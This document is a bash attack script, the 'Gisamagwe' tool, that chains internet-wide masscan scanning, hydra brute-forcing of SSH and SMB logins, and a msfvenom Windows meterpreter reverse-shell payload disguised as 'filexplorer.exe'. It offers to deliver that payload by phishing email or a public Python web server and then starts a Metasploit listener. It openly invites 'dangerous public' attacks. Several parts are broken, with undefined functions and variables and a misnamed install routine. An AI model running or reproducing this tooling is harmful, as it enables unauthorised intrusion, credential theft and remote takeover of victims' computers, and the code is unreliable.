#!/bin/bash
logs="log.sh"
file="output.txt"
usernames="usernames.txt"
passwords="passwords.txt"
logs_nmap="nmp.txt"
ip=""

function welcome(){
    echo "======================================================================================"
    echo "🚀 Welcome to Gisamagwe Miseles Cyber attacks! 💥"
    echo "You will be prompted to choose an attack after scanning vulnerabilities in this Network"
    scanner
}

# Installing necessary tools
function innstall(){
    echo "We are setting up for you, leave this to us 🛠️"
    sudo apt install nmap masscan msfconsole msfvenom ssh
    echo "done!"
    welcome
}

# Public dangerous scan
function public_scanner() {
    echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    echo "You chose violent scanning to public IPs.................."
    echo "This big number might take longer hours...................."
    read -p "Enter number of IPs to discover: " max

    # Check if the file exists
    if [ ! -f "$file" ]; then
        echo "Error: $file not found! 🚨"
        return 1  # Exit the function if file doesn't exist
    fi

    # Start masscan in the background and capture the PID
    sudo masscan 0.0.0.0/0 -p80,443,445,22 --rate 100000 --exclude 255.255.255.255 | tee -a "$file" > /dev/null &
    masscan_pid=$!  # Capture the background process ID

    # Initialize line count to 0
    lines=0

    # Start the scan loop to monitor IPs
    while [ "$max" -gt "$lines" ]; do
        # Count non-empty lines in the file (IPs discovered so far)
        lines=$(grep -cve '^\s*$' "$file")  # Count non-empty lines

        # Output the number of currently discovered IPs
        echo "Currently scanned IPs: $lines"

        # If we have reached the max IPs to discover, stop scanning
        if [ "$max" -le "$lines" ]; then
            echo "Scans complete, exiting function... 🚨"
            # Kill the masscan process after reaching the max
            kill "$masscan_pid"
            break
        fi

        # Optional: Reduce CPU usage by sleeping between checks
        #sleep 1
    done
    cat "$file"
}

# Scanning starts here......
function scanner(){
    #current_date=$(date "+%Y-%m-%d %H:%M:%S")
    current_date=$(date "+%Y-%m-%d %H:%M:%S")
    read -p "Choose 1 for Windows, 2 for Linux attack: " framework
    read -p "Enter your private network to simulate attack: " ip
    case $framework in
        1)
            echo "Scan started at: $current_date" | tee -a "$logs_nmap"
            nmap -p- -sV -O "$ip" | tee -a "$logs_nmap"
            echo "Scan ended at $(date + '+%Y-%m-%d %H:%M:%S')" | tee -a "$logs_nmap"
            ;;
        2)
            echo "Scan started at: $current_date" | tee -a "$logs_nmap"
            nmap -p- -sV -O "$ip" | tee -a "$logs_nmap"
            echo "Scan ended at $(date + '+%Y-%m-%d %H:%M:%S')" | tee -a "$logs_nmap"
            ;;
        *)
            echo "Invalid option 🚨"
            ;;
    esac
    echo "NMAP Scanning 💥.................................../\....................................Completed"
    echo "Record the above IPs and ports for entry in next attack"
}

# SMB and SSH attack done here.
function bruteForce(){
    echo "💣 You are attempting a brute force attack 💥"
    
    # Username creation
    python randomNames.py
    
    # Initialize counter variable
    i=0
    max=500
    # Password generation
    touch passwords.txt
    while IFS= read -r username
    do
        password=$(echo "$username" | openssl dgst -sha256 | cut -d ' ' -f 2 | head -c 12)  
        echo "$password" >> "$passwords"
        ((i++))
        progress=$(( (i*100) / max))
        echo "$progress% Completed"
    done < "$usernames"
    
    # The engine is ready now
    echo "Gisamagwe is ready........... 🚀"
    read -p "Choose 1 for SSH, 2 for SMB attack: " choosen
    
    # Call scanner method to check for vulnerable IP/Port
    read -p "1 for Simulation attack in your private network/Virtual machine, 2 for Dangerous public attack: " choice3
    if [[ "$choice3" == "1" ]] ; then
        scanner
    elif [[ "$choice3" == "2" ]]; then
        echo "This is much more dangerous use it at your own risk 💀"
        public_scanner
    else
        exit 1
    fi
    echo "===================="
    read -p "Enter Scanned IP to attack: " target
    read -p "Enter Open ports found: " port
    case $choosen in 
        1)
            hydra -l "$usernames" -P "$passwords" ssh://"$target" -t 4 | while read line; do 
                if echo "$line" | grep -iq "Login successful"; then
                    found_pass=$(echo "$line" | awk '{print $NF}')
                    echo "Password found for SSH: $found_pass"
                    attempt_attack "ssh" "$usernames" "$found_pass" "$ip"
                fi
            done
            ;;
        2)
            hydra -l "$names" -P "$passwords" smb://"$target:$port" -t 4 | while read line; do
                if echo "$line" | grep -iq "Login successful"; then
                    found_pass=$(echo "$line" | awk '{print $NF}')
                    echo "Password found for SMB: $found_pass"
                    attempt_attack "smb" "$username" "$found_pass" "$ip"
                fi
            done
            ;;
        *)
            echo "Invalid option 🚨"
            ;;
    esac
}

# Metasploit missiles launched here
function metas(){
    read -p "1 for automatic attack 🚀, 2 for manual: " choice2
    case $choice2 in
        1)
            target=$(ifconfig | grep inet | awk '{print $2}' | head -n 1)
            ;;
        2)
            read -p "Enter your IP to listen silently your rivals: " target
            read -p "Enter port to listen on (default 4444): " port
            ;;
        *)
            echo "Invalid choice.........."
            break
            ;;
    esac
    port=4444
    if [[ -z "$target" || -z "$port" ]]; then
        echo "Error: IP address to listen are required"
        exit 1;
    else
        msfvenom -p windows/meterpreter/reverse_tcp LHOST="$target" LPORT="$port" -f exe > filexplorer.exe
        echo "Payload created: fileexplorer.exe"
        log_attack "======================Windows payload generated for $target===================="
        read -p "Send this payload 1. through a phishing email or 2. Python server to distribute this Missile: " opt
        if [ "$opt" == "1" ]; then
            echo "Send an email now...................."
            echo "Starting the listener 🔊"
            listener
        elif [ "$opt" == "2" ]; then
            echo "Starting Python server, please share the below link with your opponent"
            python3 -m http.server 8000 --bind 0.0.0.0
            echo "Launching the listener to get root access to your rivals..............."  
            listener
        fi
    fi
}

# Listen for the PAYLOAD here.
function listener(){
    msfdb reinit
    msfconsole -x "use exploit/multi/handler;
    set PAYLOAD windows/meterpreter/reverse_tcp;
    set LHOST $target;
    set LPORT $port;
    exploit" &
}

function attacks(){
    echo "🎯 Welcome to Gisamagwe attacking and vulnerability tool. Use it at your own risk 🎯"
    echo "We are offering you various attacks========>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    echo " You can use Cmd/Ctrl + c to quit"
    echo "Pre-requisites:"
    echo "Make sure you are using Linux and that these tools nmap, hydra, msfvenom, msfconsole, masscan, ssh, and smb services are running."
    read -p "Choose 1 to install tools" tool
    if [ $tool -eq 1 ]; then
		install
	fi
    read -p "Choose 1 for Gisamagwe missile 🚀, 2 for Gisamagwe SMB Attack 💣, 3 for SSH Gisamagwe attack 🔓: " choice1
    case $choice1 in
        1)
            metas
            ;;
        2)
            bruteForce
            ;;
        3)
            bruteForce
            ;;
        *)
            echo "Invalid option, quitting 😞"  
            exit 0
            ;;
    esac
}

attacks

